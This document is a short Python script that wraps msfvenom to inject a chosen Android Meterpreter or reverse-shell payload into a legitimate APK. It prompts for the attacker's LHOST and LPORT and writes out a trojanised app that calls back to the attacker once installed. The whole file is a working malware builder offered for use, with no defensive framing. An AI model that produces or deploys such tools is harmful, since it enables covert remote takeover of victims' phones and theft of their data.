#!/usr/bin/env pyhton


#    / ___| | | |_   _| ____| __ )| ____|  / \  / ___|_   _|
#   | |   | | | | | | |  _| |  _ \|  _|   / _ \ \___ \ | |  
#   | |___| |_| | | | | |___| |_) | |___ / ___ \ ___) || |  
#    \____|\___/  |_| |_____|____/|_____/_/   \_\____/ |_|  
#                                                        

import subprocess

print("[+] This is created by Cutebeast/ZAKRIA KHAN\nDeveloper Email : TOPTUTORIALTT@GMAIL.COM")

def payload_number():
    number = input("TYPE PAYLOAD NUMBER : ")
    if number == "1" :
        return "android/meterpreter/reverse_tcp"
    elif number == "2" :
        return "android/meterpreter/reverse_http"
    elif number == "3" :
        return "android/meterpreter/reverse_https"
    elif number == "4" :
        return "android/shell/reverse_tcp"
    elif number == "5" :
        return "android/shell/reverse_http"
    elif number == "6" :
        return "android/shell/reverse_https"
    elif number == "7" :
        return "android/meterpreter_reverse_tcp"
    elif number == "8" :
        return "android/meterpreter_reverse_http"
    elif number == "9" :
        return "android/meterpreter_reverse_https"
    else:
        print("please enter the right payload number")
        
Lhost = input("TYPE YOUR LHOST : ")

Lport = input("TYPE YOUR LPORT : ")
print(" 1 : android/meterpreter/reverse_tcp \n 2 : android/meterpreter/reverse_http \n 3 : android/meterpreter/reverse_https \n 4 : android/shell/reverse_tcp \n 5 : android/shell/reverse_http \n 6 : android/shell/reverse_https \n 7 : android/meterpreter_reverse_tcp \n 8 : android/meterpreter_reverse_http \n 9 : android/meterpreter_reverse_https ")
payload = payload_number()
print("enter path of your apk e.g : /root/Downloads/file.apk")
Apk = input("TYPE PATH OF YOUR ORIGNAL APK : ")
print("enter path where you want to save the new apk e.g : /root/Desktop/file.apk")
newapk = input("TYPE PATH WHERE YOU WANT TO SAVE YOUR NEW APK : ")
#msfvenom -x orignalapk -p payload LHOST=ip LPORT=port -o /root/Desktop/filename.apk
subprocess.call(f"msfvenom -x {Apk} -p {payload} LHOST={Lhost} LPORT={Lport} -o {newapk}", shell=True)
